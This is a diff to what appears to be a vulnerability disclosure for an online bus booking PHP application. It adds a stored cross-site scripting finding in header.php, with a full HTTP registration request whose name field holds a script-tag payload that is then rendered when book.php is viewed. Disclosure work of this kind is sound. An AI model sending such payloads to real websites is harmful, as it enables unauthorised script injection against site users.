@@ -414,4 +414,39 @@ $sql_transactions="INSERT INTO bustransactions(email,source,dest,Name,Bus_No,NoO
 
 Parameterized queries or precompiled statements should be used to ensure that user input is processed and escaped correctly. This can prevent attackers from tampering with query logic by injecting malicious code.
 
+# 10. header.php Cross-site Scripting (XSS)
+
+at header.php line 132
+
+![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/4afd0de2-a08f-48c4-9b6f-c63ba07e4365)
+
+POC:
+regist new user
+
+name have xss payload
+
+```
+POST /register_insert.php HTTP/1.1
+Host: onlinebus
+Content-Length: 117
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://onlinebus
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://onlinebus/register.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=jmetab2u149tgvq0m6nh6mbeh9
+Connection: close
+
+name=<script>alert(2102)</script>&email=qqq%40qq.com&Gender=M&dob=2002-02-02&password=123456&phone=2&register_submit=
+```
+
+open book.php can load header.php
+
+![image](https://github.com/gtqbhksl/weekdays_something/assets/113713406/e12ac2a3-073d-4b8c-a521-b620834aa33a)
+
+
 
